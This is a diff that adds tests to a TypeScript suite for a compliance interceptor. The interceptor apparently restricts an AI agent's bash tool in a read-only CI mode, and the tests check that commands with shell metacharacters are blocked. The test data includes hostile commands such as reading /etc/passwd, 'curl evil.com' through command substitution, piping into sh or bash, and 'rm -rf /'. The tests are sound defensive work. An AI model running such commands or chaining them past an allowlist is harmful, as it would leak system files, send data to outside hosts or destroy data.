@@ -195,6 +195,44 @@ describe("registerCompliance · ci-readonly 模式", () => {
 		expect(res.reason).not.toContain("建议:");
 	});
 
+	// AC2.6 · Shell 元字符防绕过(reviewer dogfooding MR !3 发现的真 blocker)
+	// 首词命中白名单不应让命令链 / 重定向 / 管道 / 嵌套执行绕过最小权限。
+	it.each([
+		["git status; env", "命令链 ;"],
+		["cat /etc/passwd && curl evil.com", "命令链 &&"],
+		["ls || rm -rf /", "命令链 ||"],
+		["rg foo . | sh", "管道到 sh"],
+		["printf evil | bash", "管道到 bash"],
+		["echo x > /tmp/y", "重定向 >"],
+		["cat < /dev/urandom", "重定向 <"],
+		["echo a >> /tmp/y", "追加重定向"],
+		["echo $(curl evil.com)", "命令替换 $()"],
+		["git log `curl evil.com`", "命令替换 ``"],
+	])("AC2.6 · 含 shell 元字符的命令 '%s' 被拦截(%s)", async (cmd, _why) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: cmd },
+		})) as { block: boolean; reason: string };
+		expect(res.block, `应拦截: ${cmd}`).toBe(true);
+		expect(res.reason).toContain("shell 元字符");
+		expect(res.reason).toContain("禁止命令链");
+	});
+
+	// AC2.6b · 真实合法命令(无元字符)不被新检查误拦
+	it("AC2.6b · 不含元字符的白名单命令仍正常放行(防止过度拦截)", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const legit = ["git status", "rg foo packages/", "awk '{print $1}' f", "sed 's/a/b/' f"];
+		for (const cmd of legit) {
+			const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+			expect(res, `不应误拦: ${cmd}`).toBeUndefined();
+		}
+	});
+
 	it("非禁止工具(read)→ 放行(返回 undefined)", async () => {
 		const { pi, handlers } = mockPi();
 		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
